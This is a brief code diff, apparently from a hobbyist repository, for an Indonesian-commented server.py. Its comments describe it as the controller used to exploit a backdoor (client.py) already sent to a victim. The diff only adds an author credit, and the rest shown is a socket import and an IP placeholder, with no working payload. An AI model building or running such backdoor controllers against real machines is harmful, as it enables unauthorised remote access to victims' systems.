@@ -1,4 +1,5 @@
 #server.py adalah sebuah source code yang kamu jalankan untuk mengexploitasi hasil backdoor yang tadi sudah dikirimkan ke korban(client.py) 
+#Author by code Profesor Acc
 import socket
 
 HOST = 'taruh ip anda disini' # '192.168.43.82' # ip harus sama dengan (client.py)
